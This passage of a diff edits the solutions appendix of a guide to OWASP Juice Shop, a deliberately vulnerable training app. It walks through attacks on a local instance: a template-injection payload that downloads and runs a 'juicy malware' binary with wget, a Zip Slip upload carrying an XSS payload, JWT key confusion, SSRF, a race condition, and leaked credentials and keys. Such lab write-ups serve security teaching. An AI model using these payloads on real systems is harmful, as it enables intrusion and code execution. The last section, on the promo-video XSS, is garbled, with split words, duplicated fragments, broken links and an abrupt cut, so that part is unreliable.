    to _Morty Smith_ as the most likely user identity
 
-   ![Morty Smith](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/Morty_Smith.jpg)
+   ![Morty Smith](img/Morty_Smith.jpg)
 2. Visit http://rickandmorty.wikia.com/wiki/Morty and skim through the
    [Family](http://rickandmorty.wikia.com/wiki/Morty#Family) section
 3. It tells you that Morty had a dog named _Snuffles_ which also goes by
@@ -1545,8 +1855,8 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
    solved.
 9. Feel free to cancel the script execution at this point.
 
-:godmode: If you do not want to write your own script for this
-challenge, take a look at
+📕: If you do not want to write your own script for this challenge,
+take a look at
 [juice-shop-mortys-question-brute-force.py](https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820)
 which was kindly published as a Gist on GitHub by
 [philly-vanilly](https://github.com/philly-vanilly).
@@ -1573,7 +1883,7 @@ which was kindly published as a Gist on GitHub by
    http://localhost:3000/public/images/products/3d_keychain.jpg and view
    its [Exif metadata](https://en.wikipedia.org/wiki/Exif)
 
-   ![3D printed logo Exif metadata](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/exif-3d_keychain.png)
+   ![3D printed logo Exif metadata](img/exif-3d_keychain.png)
 3. Researching the camera model entry _OpenSCAD_ reveals that this is a
    program to create 3D models, which works with `.stl` files
 4. As no further hint on the blueprint filename or anything is given, a
@@ -1583,8 +1893,8 @@ which was kindly published as a Gist on GitHub by
 6. This model will actually allow you to 3D-print your own OWASP Juice
    Shop logo models!
 
-   ![JuiceShop.stl Surface Angle view](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/JuiceShop.stl_surface.png)
-   ![JuiceShop.stl Wireframe view](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/JuiceShop.stl_wireframe.png)
+   ![JuiceShop.stl Surface Angle view](img/JuiceShop.stl_surface.png)
+   ![JuiceShop.stl Wireframe view](img/JuiceShop.stl_wireframe.png)
 
 The official place to retrieve this and other media or artwork files
 from the Juice Shop (and other OWASP projects or chapters) is
@@ -1612,7 +1922,7 @@ from the Juice Shop (and other OWASP projects or chapters) is
    `https://github.com/eslint/eslint-scope/issues/39` in the comment to
    solve this challenge
 
-### Inform the shop about a more sneaky instance of typosquatting it fell for
+### Inform the shop about a typosquatting imposter that dug itself deep into the frontend
 
 1. Request <http://localhost:3000/3rdpartylicenses.txt> to retrieve the
    3rd party license list generated by Angular CLI by default
@@ -1620,7 +1930,7 @@ from the Juice Shop (and other OWASP projects or chapters) is
    `ng2-bar-rating` which openly reveals its intent on
    https://www.npmjs.com/package/ng2-bar-rating
 
-   ![epilogue-js on NPM](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/npm_ng2-bar-rating.png)
+   ![epilogue-js on NPM](img/npm_ng2-bar-rating.png)
 3. Visit <http://localhost:3000/#/contact>
 4. Submit your feedback with `ng2-bar-rating` in the comment to solve
    this challenge
@@ -1631,7 +1941,7 @@ _a lot harder_ to distinguish from the original repository
 MODULE YOU ARE LOOKING FOR!_-warning at the very top. Below you can see
 the original `ngx-bar-rating` module page on NPM:
 
-![ngx-bar-rating on NPM](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/npm_ngx-bar-rating.png)
+![ngx-bar-rating on NPM](img/npm_ngx-bar-rating.png)
 
 ### Give the server something to chew on for quite a while
 
@@ -1703,7 +2013,7 @@ loop`._
 ><lolz>&lol9;</lolz>
 > ```
 
-## Diabolic Challenges (  :star::star::star::star::star::star:  )
+## ⭐⭐⭐⭐⭐⭐ Challenges
 
 ###  Overwrite the Legal Information file
 
@@ -1712,7 +2022,7 @@ loop`._
    account you will notice
    <https://twitter.com/owasp_juiceshop/status/1107781073575002112>.
 
-   ![Tweet advertising ZIP uploads in "File Complaint"](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/tweet_zip-complaints.png)
+   ![Tweet advertising ZIP uploads in "File Complaint"](img/tweet_zip-complaints.png)
 2. Researching ZIP-based vulnerabilities should also yield
    [Zip Slip](https://snyk.io/research/zip-slip-vulnerability) which
    exploits directory traversal filenames in file archives.
@@ -1759,7 +2069,7 @@ totally different attack styles.
 3. You can rightfully speculate that the last five characters represent
    the actual discount value. The change in the last character for the
    12th code comes from a different (probably higher) discount in
-   December! :santa:
+   December! 🎅
 4. Check the official Juice Shop Twitter account for a valid coupon
    code: <https://twitter.com/owasp_juiceshop>
 5. At the time of this writing - January 2017 - the broadcasted coupon
@@ -1800,18 +2110,18 @@ totally different attack styles.
 4. Visit <https://www.npmjs.com/package/z85> and check the _Dependents_
    tab:
 
-   ![Dependents of z85 on npmjs.com](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/z85-dependents.png)
+   ![Dependents of z85 on npmjs.com](img/z85-dependents.png)
 5. If you have Node.js installed locally run `npm install -g z85-cli` to
    install <https://www.npmjs.com/package/z85-cli> - a simple command
    line interface for `z85`:
 
-   ![z85-cli page on npmjs.com](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/z85-cli.png)
+   ![z85-cli page on npmjs.com](img/z85-cli.png)
 6. Check the official Juice Shop Twitter account
    <https://twitter.com/owasp_juiceshop> for a valid coupon code. At the
    time of this writing - January 2017 - the broadcasted coupon was
    `n<Mibh.u)v` promising a 50% discount.
 
-   ![Coupon Code for January 2017 on @owasp_juiceshop](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master//appendix/img/coupon_code-january2017.png)
+   ![Coupon Code for January 2017 on @owasp_juiceshop](/appendix/img/coupon_code-january2017.png)
 7. Decrypting this code with `z85 -d "n<Mibh.u)v"` returns `JAN17-50`
 8. Encrypt a code valid for the current month with 80% or more discount,
    e.g. `z85 -e JAN17-80` which yields `n<Mibh.v0y`.
@@ -1825,14 +2135,13 @@ totally different attack styles.
    forgot to send coupons too often so that the process was automated at
    some point?
 
-   ![Coupon tweeted by a bot](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/coupon_tweet_bot.png)
+   ![Coupon tweeted by a bot](img/coupon_tweet_bot.png)
 2. Some Internet research will bring you to the
    [NPM module `juicy-coupon-bot`](https://www.npmjs.com/package/juicy-coupon-bot)
    and its associated GitHub repository
-   <https://github.com/bkimminich/juicy-coupon-bot>.
-   :information_source: _As this is not part of the Juice Shop repo
-   itself and it is publicly accessible, analyzing this repository is
-   **not** considered cheating!_
+   <https://github.com/bkimminich/juicy-coupon-bot>. ℹ️ _As this is
+   not part of the Juice Shop repo itself and it is publicly accessible,
+   analyzing this repository is **not** considered cheating!_
 3. Open the `.travis.yml` to see how the bot's CI/CD process is set up.
    You can also look at the job results and logs at
    <https://travis-ci.org/bkimminich/juicy-coupon-bot>.
@@ -1866,7 +2175,7 @@ totally different attack styles.
    introduced the API call, replacing the previous programmatic creation
    of a coupon code.
 
-   ![Diff of local and cloud-based coupon creation](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/git-diff_coupon_lambda.png)
+   ![Diff of local and cloud-based coupon creation](img/git-diff_coupon_lambda.png)
 9. You now have learned the coupon format and that it is `z85` encoded.
    You can now either manipulate your local clone of the "pre-`fde2003`
    version" of the `juicy-coupon-bot` or fall back to the last part of
@@ -1915,7 +2224,7 @@ totally different attack styles.
 2. Download the application's public JWT key from
    <http://localhost:3000/encryptionkeys/jwt.pub>
 
-   ![encryption keys](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jwt2-findkey.PNG)
+   ![encryption keys](img/jwt2-findkey.PNG)
 3. Download and install the
    [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
 4. In the _BApp Store_ tab under the _Extender_ tab within Burp Suite
@@ -1923,28 +2232,43 @@ totally different attack styles.
    [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
    extension (aka _JOSEPH_)
 
-   ![load extension](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jwt2-burpextension.PNG)
+   ![load extension](img/jwt2-burpextension.PNG)
 5. Send any captured request that has an `Authorization: Bearer` token
    to Burp's _Repeater_.
 6. Once in _Repeater_, click the _JWS_ tab, then the _Payload_ tab
    beneath and modify the email parameter to be `rsa_lord@juice-sh.op`.
 
-   ![modify payload](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jwt2-request.PNG)
+   ![modify payload](img/jwt2-request.PNG)
 7. Next, click the _Attacker_ tab, select _Key Confusion_, then click
    _Load_.
 8. Paste in the contents of the `jwt.pub` file without the `-----BEGIN
    RSA PUBLIC KEY-----` and `-----END RSA PUBLIC KEY-----` lines.
 
-   ![key confusion](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jwt2-keyconfusion.PNG)
+   ![key confusion](img/jwt2-keyconfusion.PNG)
 9. Click _Update_ and then _Go_ in the top left to send the modified
    request via Burp and solve this challenge!
 
-:clap: Kudos to [Tyler Rosonke](https://github.com/ZonkSec) for
-providing this solution.
+👏 Kudos to [Tyler Rosonke](https://github.com/ZonkSec) for providing
+this solution.
 
 ###  Like any review at least three times as the same user
 
-:wrench: **TODO**
+1. Liking a review normally results in a request to
+   <http://localhost:3000/rest/products/reviews> which associates the
+   email of the user with the review (identified by the JSON body of
+   e.g. `{id: "ZQdzyRCbwQ4ys3PCG"}`) and also increases its like counter
+   by one.
+2. If you try to replay the same request you will get a `403 Forbidden`
+   HTTP status with `{"error":"Not allowed"}` in the response.
+3. Write a script that simultaneously executes three requests to
+   <http://localhost:3000/rest/products/reviews> with body e.g. `{id:
+   "ZQdzyRCbwQ4ys3PCG"}` and run it.
+4. If your 3 requests get handled asynchronously withing an (artificial)
+   150ms time window, you will cause a race condition and all will get
+   through and each increase the like counter by one to a total of
+   three!
+5. Back in your browser you should now see the corresponding challenge
+   marked as solved!
 
 ### Log in with the support team's original user credentials
 
@@ -1960,7 +2284,7 @@ to use some unofficial port._
    `support`) will yield an interesting log statement that is printed
    when the support logs in with the wrong password:
 
-   ![Support team login hint in minified JS](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master//appendix/img/minified-js_support-hint.png)
+   ![Support team login hint in minified JS](/appendix/img/minified-js_support-hint.png)
 4. The logged text is in Romanian language: `<!-- @echipa de suport:
    Secretul nostru comun este încă Caoimhe cu parola de master gol! -->`
 5. Running this through an online translator yields something like:
@@ -1979,19 +2303,19 @@ to use some unofficial port._
    (stereo-)typical attribute of Irish people - so maybe she actually
    _is_ "Caoimhe"?
 
-   ![Photo of Caoimhe in About Use carousel](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/caoimhe.png)
+   ![Photo of Caoimhe in About Use carousel](img/caoimhe.png)
 10. Download the photo
     <http://localhost:3000/public/images/carousel/6.jpg> and use it as a
     key file to unlock the KeePass database.
 11. Find the password for the support team user account in the `prod`
     entry of the KeePass file.
 
-    ![Unlocked KeePass file](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/keepass-list.png)
+    ![Unlocked KeePass file](img/keepass-list.png)
 12. Log in with `support@juice-sh.op` as _Email_ and
     `J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P` as _Password_ to beat this
     challenge.
 
-    ![Credentials of the support team in the KeePass file](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/keepass-prod_entry.png)
+    ![Credentials of the support team in the KeePass file](img/keepass-prod_entry.png)
 
 ### Unlock Premium Challenge to access exclusive content
 
@@ -1999,7 +2323,7 @@ to use some unofficial port._
    Board_ table reveals a HTML comment that is obviously encrypted:
    `<!--IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==-->`.
 
-   ![DOM inspection of the Unlock Premium Challenge button](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/inspect-premium_challenge.png)
+   ![DOM inspection of the Unlock Premium Challenge button](img/inspect-premium_challenge.png)
 2. This is a cipher text that came out of an AES-encryption using AES256
    in CBC mode.
 3. To get the key and the IV, you should run a _Forced Directory
@@ -2012,7 +2336,7 @@ to use some unofficial port._
    2. The search will uncover <http://localhost:3000/encryptionkeys> as
       a browsable directory
 
-      ![Browsable directoy "encryptionkeys"](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/encryptionkeys_directory.png)
+      ![Browsable directoy "encryptionkeys"](img/encryptionkeys_directory.png)
    3. Open <http://localhost:3000/encryptionkeys/premium.key> to
       retrieve the AES encryption key `EA99A61D92D2955B1E9285B55BF2AD42`
       and the IV `1337`.
@@ -2043,76 +2367,141 @@ to use some unofficial port._
 
 ###  Request a hidden resource on server through server
 
-:wrench: **TODO**
+1. Solve
+   [Infect the server with "juicy malware" by abusing arbitrary command execution](#infect-the-server-with-juicy-malware-by-abusing-arbitrary-command-execution)
+   at least to the point where you have access to the "juicy malware"
+   executables.
+2. Similar to that SSTi challenge, the vulnerable place for this one is
+   found on the <http://localhost:3000/profile> page.
+3. The only promising input field for an SSRF attack is the _Gravatar
+   URL_. Open your browser's DevTools and watch the _Network_ tab.
+4. Type any URL (e.g. <https://placekitten.com/100/100>) into _Gravatr
+   URL_ and click _Link Gravatar_. You will realize a request
+   <http://juice-shop-staging.herokuapp.com/profile/image/url> with the
+   chosen <https://placekitten.com/100/100> as paramter `imageUrl`.
+5. You will find no HTTP request to <https://placekitten.com/100/100>
+   going out from your browser, though. As the image was retrieved and
+   associated with your profile, it must have been downloaded _by the
+   Juice Shop server_.
 
-###  Infect the server with malware by abusing arbitrary command execution
+   ![Placekitten image associated with a user profile](img/ssrf_placekitten.png)
+6. To solve this challenge, you need to find a secret URL hidden inside
+   the "juicy malware" and simulate a self-targeted SSRF attack with it.
+7. Use your favorite decompiler(s) to see what is going on inside the
+   malware program...
+8. ...or execute the malware while tunneling all its traffic through a
+   proxy.
+9. Either way you should be able to identify the URL being called by it
+   is
+   <http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3>
+10. Visiting that URL directly will not do anything, as it needs to be
+    called through the _Gravatar Link_ field that was presumably
+    vulnerable to SSRF
+11. Paste the URL in and click _Link Gravatar_ to get the expected
+    challenge solved notification!
 
-:wrench: **TODO**
+###  Infect the server with juicy malware by abusing arbitrary command execution
 
-### Embed an XSS payload into one of our marketing collaterals
+1. Perform the totally obvious Google search for `juicy malware` to find
+   <https://github.com/J12934/juicy-malware>
+2. Alternatively you also find three `.url` files with direct links in
+   <http://localhost:3000/ftp/quarantine> but you'll probably need to
+   understand how to solve any of
+   [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file),
+   [Access a salesman's forgotten backup file](#access-a-salesmans-forgotten-backup-file)
+   or
+   [Access a misplaced SIEM signature file](#access-a-misplaced-siem-signature-file)
+   first.
+3. Your goal is to use RCE to make the server download and execute the
+   malware version for the server OS, so on Linux you might want to run
+   something like `wget -O malware
+   https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
+   && chmod +x malware && ./malware`
+4. You probably realized by now that <http://localhost:3000/profile> is
+   not an Angular page? This page is written using
+   [Pug](https://pugjs.org) which happens to be a Template engine and
+   therefore perfectly suited for SSTi mischief.
+5. Set your _Username_ to `1+1` and click _Set Username_. Your username
+   will be just shown as `1+1` under the profile picture.
+6. Trying template injection into Pug set _Username_ to `#{1+1}` and
+   click _Set Username_. Your username will now be shown as `2` under
+   the profile picture!
+7. Craft a payload that will abuse the lack of encapsulation of
+   JavaScript's `global.process` object to dynamically load a library
+   that will allow you to spawn a process on the server that will then
+   download and execute the malware.
+8. The payload might look like
+   `#{global.process.mainModule.require('child_process').exec('wget -O
+   malware
+   https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
+   && chmod +x malware && ./malware')}`. Submit this as _Username_ and
+   (on a Linux server) the challenge should be marked as solved
 
-1. The author
-   [tweeted about a new promotion video](https://twitter.com/bkimminich/status/1114621693299916800)
-   from his personal account, openly spoilering the URL
-   <http://juice-shop-staging.herokuapp.com/promotion>
+ℹ️ Remember that you need to use the right malware file for your
+server's operation system and also their synonym command for `wget`.
 
-   ![Tweet promoting a new in-app promotion video](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/tweet_promotion.png)
-2. Visit <http://localhost:3000/promotion> to watch the video. You will
-   notice that it comes with subtitles enabled by default.
+### Embed an XSS payload into our promo video
 
-   ![In-app promotion video](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/promo_video.png)
-3. Right-click and select _View Source_ on the page to learn that it
-   loads its video from <http://localhost:3000/video> and that the
-   subtitles are directly embedded in the page itself.
-4. Inspecting the response for <http://localhost:3000/video> in the
-   _Network_ tab of your DevTools shows an interesting header
-   `Content-Location: /assets/public/videos/JuiceShopJingle.mp4`
-5. Trying to access the video directly at
-   <http://localhost:3000/assets/public/videos/JuiceShopJingle.mp4>
-   works fine.
-6. Getting a directory listing for
-   <http://localhost:3000/assets/public/videos> does not work
-   unfortunately.
-7. Knowing that the subtitles are in
-   [WebVTT](https://www.w3.org/TR/webvtt1/) format (from step 3) a lucky
-   guess would be that a corresponding `.vtt` file is available
-   alongside the video.
-8. Accessing
-   <http://localhost:3000/assets/public/videos/JuiceShopJingle.vtt>
-   proves this assumption correct.
-9. As the subtitles are not loaded separately by the client, they must
-   be embedded on the server side. If this embedding happens without
-   proper safeguards, an XSS attack would be possible if the subtitles
-   files could be overwritten.
-10. The prescribed XSS payload also hints clearly at the intended attack
-    against the subtitles, which are themselves enclosed in a `<script>`
-    tag, which the payload will try to close prematurely with its
-    starting `</script>`.
-11. To successfully overwrite the file, the Zip Slip vulnerability
-    behind the
-    [Overwrite the Legal Information file](#overwrite-the-legal-information-file)
-    challenge can be used.
-12. The blind part of this challenge is the actual file location in the
-    server file system. Trying to create a Zip file with any path trying
-    to traverse into `../../assets/public/videos/` will fail. Notice
-    that `../../` was sufficient to get to the root folder in
-    [Overwrite the Legal Information file](#overwrite-the-legal-information-file).
-13. This likely means that there is a deeper directory structure in
-    which `assets/` resides.
-14. This actual directory structure on the server is created by the
-    AngularCLI tool when it compiles the application and looks as
-    follows: `frontend/dist/frontend/assets/`.
-15. Prepare a ZIP file with a `JuiceShopJingle.vtt` inside that contains
-    the prescribed payload of ``</script><script>alert(`xss`)</script>``
-    with `zip exploit.zip
-    ../../frontend/dist/frontend/assets/public/video/JuiceShopJingle.vtt`
-    (on Linux).
-16. Upload the ZIP file on <http://localhost:3000/#/complain>.
-17. The challenge notification will not trigger immediately, as it
-    requires you to actually execute the payload by visiting
-    <http://localhost:3000/promotion> again.
-18. You will see the alert box and once you go _Back_ the challenge
-    solution should trigger accordingly.
+r p romo video 1. The author
+[tweeted about a new promotion video](https://twitter.com/bkimminich/status/1114621693299916800)
+from his personal account, openly spoilering the URL
+<http://juice-shop-staging.herokuapp.
+
+    <http://juice-shop-staging.herokuapp.com/promotion>
+       ![Tweet promoting a new in-app promotion video](img/tweet
+    _
+
+pro motion.png) 2. Visit <http://localhost:3000/promotion> to watch the
+video. You will notice that it comes with subtitles enabl
+
+    notice that it comes with subtitles enabled by default.
+       ![In-app promotion video](img/p
+    r
+
+omo _video.png) 3. Right-click and select _View Source_ on the page to
+learn that it loads its video from <http://localhost:3000/video> and
+that the subtitles are directly embedded in th e p age itself. 4.
+Inspecting the response for <http://localhost:3000/video> in the
+_Network_ tab of your DevTools shows an interesting header
+`Content-Location: /assets/public/videos/JuiceS hop Jingle.mp4` 5.
+Trying to access the video directly at
+<http://localhost:3000/assets/public/videos/JuiceShopJingle.mp4> works
+fine. 6. Getting a directory listing for
+<http://localhost:3000/assets/public/videos> does not work unf
+ortunately. 7. Knowing that the subtitles are in
+[WebVTT](https://www.w3.org/TR/webvtt1/) format (from step 3) a lucky
+guess would be that a corresponding `.vtt` file is available alongs ide
+the video. 8. Accessing
+<http://localhost:3000/assets/public/videos/JuiceShopJingle.vtt> proves
+this assum pti on correct. 9. As the subtitles are not loaded separately
+by the client, they must be embedded on the server side. If this
+embedding happens without proper safeguards, an XSS attack would be
+possible if the subtitles files could b e ov erwritten. 10. The
+prescribed XSS payload also hints clearly at the intended attack against
+the subtitles, which are themselves enclosed in a `<script>` tag, which
+the payload will try to close prematurely with its startin g `<
+/script>`. 11. To successfully overwrite the file, the Zip Slip
+vulnerability behind the
+[Overwrite the Legal Information file](#overwrite-the-legal-information-file)
+challeng e ca n be used. 12. The blind part of this challenge is the
+actual file location in the server file system. Trying to create a Zip
+file with any path trying to traverse into `../../assets/public/videos/`
+will fail. Notice that `../../` was sufficient to get to the root folder
+in
+[Overwrite the Legal Information file](#overwrite-the-legal-information-file).
+13\. This likely means that there is a deeper directory structure in
+which `ass ets/ ` resides. 14. This actual directory structure on the
+server is created by the AngularCLI tool when it compiles the
+application and looks as follows: `frontend/dist/fron tend /assets/`.
+15\. Prepare a ZIP file with a `JuiceShopJingle.vtt` inside that contains
+the prescribed payload of ``</script><script>alert(`xss`)</script>``
+with `zip exploit.zip
+../../frontend/dist/frontend/assets/public/video/JuiceShopJingle.vtt` (
+on Linux). 16. Upload the ZIP file on <http://localhost:300 0/#/
+complain>. 17. The challenge notification will not trigger immediately,
+as it requires you to actually execute the payload by visiting
+<http://localhost:3000/pro moti on> again. 18. You will see the alert
+box and once you go _Back_ the challenge solution should trigge
 
 [^1]: <https://en.wikipedia.org/wiki/ROT13>
 
